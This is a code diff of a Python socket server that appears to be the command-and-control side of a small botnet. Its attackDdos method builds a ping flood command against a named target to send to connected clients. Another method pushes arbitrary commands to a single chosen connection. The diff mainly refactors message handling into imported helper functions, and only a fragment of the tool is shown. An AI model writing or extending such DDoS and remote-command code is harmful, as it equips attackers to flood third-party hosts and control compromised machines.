@@ -1,11 +1,13 @@
 import socket
+from Functions import setMessage, getMessage
+from threading import Thread
 #from _dbus_bindings import Message
 
-class Server:
+class Server(Thread):
 
     def __init__(self, ip, port):
         self.ip = ip
-        self.port = port  
+        self.port = port
 
     def run(self):
         self.connections = {}
@@ -37,18 +39,16 @@ class ServerOutput(Server):
         print(data)
     
 class ServerInput(Server):
-    
-    def setMessage(self, message):
-        self.message = message
         
     def attackDdos(self,canonicalName,times, packageWeight):
-        self.setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight))
-        self.run()
+        setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight),False)
     
     def conectWithOneConnection(self,key,command):
         connection = self.connections.get(key) 
-        self.setMessage(command)
+        setMessage(command)
         self.runSpecific(connection)
     
     def runSpecific(self, connection):
-        connection.sendall((bytes(self.message, "utf-8")))
+        connection.sendall((bytes(getMessage(), "utf-8")))
+
+
